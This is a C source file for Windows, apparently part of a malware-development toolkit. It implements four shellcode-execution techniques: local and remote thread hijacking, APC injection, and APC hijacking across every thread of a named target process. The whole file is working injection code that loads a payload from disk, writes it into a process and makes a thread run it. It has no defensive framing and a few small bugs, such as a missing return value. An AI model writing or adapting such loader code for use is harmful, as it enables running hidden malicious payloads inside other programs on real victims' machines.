#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <Psapi.h>

#include "Common.h"
#include "Structs.h"


BOOL LocalThreadHijacking(IN LPCSTR lpShellcodePath, IN DWORD dwMainThreadId)
{
	PVOID pShellcode = NULL, pShellcodeAddr = NULL;
	SIZE_T sShellcodeSize;
	HANDLE hThread;
	DWORD dwThreadId;

	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
		return FALSE;

	if (!AllocateMemory(NULL, pShellcode, sShellcodeSize, &pShellcodeAddr))
		return FALSE;

	if (!ObtainThreadHandle(NULL, dwMainThreadId, &hThread, &dwThreadId))
		return FALSE;

	if (!HijackThread(hThread, pShellcodeAddr))
		return FALSE;

	if (!WaitForThread(hThread))
		return FALSE;

	LocalFree(pShellcode);
	FreeMemory(NULL, pShellcodeAddr);
	CloseHandle(hThread);
}

BOOL RemoteThreadHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
{
	PVOID pShellcode = NULL, pShellcodeAddr = NULL;
	SIZE_T sShellcodeSize;
	HANDLE hThread, hProcess;
	DWORD dwThreadId, dwProcessId;

	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
		return FALSE;

	if (!ObtainProcessHandle(SNAPSHOT, lpProcessName, &hProcess, &dwProcessId))
		return FALSE;

	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
		return FALSE;

	if (!ObtainThreadHandle(dwProcessId, NULL, &hThread, &dwThreadId))
		return FALSE;

	if (!HijackThread(hThread, pShellcodeAddr))
		return FALSE;

	if (!WaitForThread(hThread))
		return FALSE;

	LocalFree(pShellcode);
	FreeMemory(hProcess, pShellcodeAddr);
	CloseHandle(hThread);

	return TRUE;
}

BOOL ApcInjection(IN BOOL bAlertable, IN DWORD dwAlertableFunction, IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
{
	HANDLE hThread, hProcess = NULL;
	DWORD dwThreadId, dwProcessId;
	PVOID pShellcode, pShellcodeAddr;
	SIZE_T sShellcodeSize;
	BOOL bRemote = TRUE ? lpProcessName != NULL : FALSE;

	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
		return FALSE;

	if (bRemote)
		if (!ObtainProcessHandle(SNAPSHOT, lpProcessName, &hProcess, &dwProcessId))
			return FALSE;

	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
		return FALSE;

	if (bAlertable)
		CreateAlertableThread(hProcess, dwAlertableFunction, &hThread, &dwThreadId);
	else // Create a suspended thread
		RunThread(hProcess, TRUE, &DummyFunction, &hThread, &dwThreadId);

	printf("[i] Queued the APC function for execution\n");
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pShellcodeAddr;
	if (!QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL))
		return ReportErrorWinAPI("QueueUserAPC");

	if (!bAlertable) // Resume the suspended thread
		ResumeThread(hThread);

	if (!WaitForThread(hThread))
		return FALSE;


	LocalFree(pShellcode);
	FreeMemory(hProcess, pShellcodeAddr);
	CloseHandle(hThread);

	return TRUE;
}

BOOL ApcHijacking(IN LPCSTR lpProcessName, IN LPCSTR lpShellcodePath)
{
	HANDLE hSnapshot, hProcess, hThread = NULL;
	THREADENTRY32 Thr = { .dwSize = sizeof(THREADENTRY32) };
	DWORD dwProcessId;
	PVOID pShellcode, pShellcodeAddr;
	SIZE_T sShellcodeSize;
	int NumberOfThreads = 0;

	if (!FetchShellcode(lpShellcodePath, &pShellcode, &sShellcodeSize))
		return FALSE;

	if (!ObtainProcessHandle(SNAPSHOT, lpProcessName, &hProcess, &dwProcessId))
		return FALSE;

	if (!AllocateMemory(hProcess, pShellcode, sShellcodeSize, &pShellcodeAddr))
		return FALSE;
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)pShellcodeAddr;

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL)) == INVALID_HANDLE_VALUE)
		return ReportErrorWinAPI("CreateToolhelp32Snapshot");
	if (Thread32First(hSnapshot, &Thr))
	{
		do
		{
			if (Thr.th32OwnerProcessID == dwProcessId)
			{
				if ((hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID)) != NULL)
					QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
				NumberOfThreads++;
				Sleep(2000);
			}
		} while (Thread32Next(hSnapshot, &Thr));
	}
	printf("[i] Queued %d threads\n", NumberOfThreads);

	CloseHandle(hSnapshot);
	FreeMemory(hProcess, pShellcodeAddr);
	CloseHandle(hThread);

	return TRUE;
}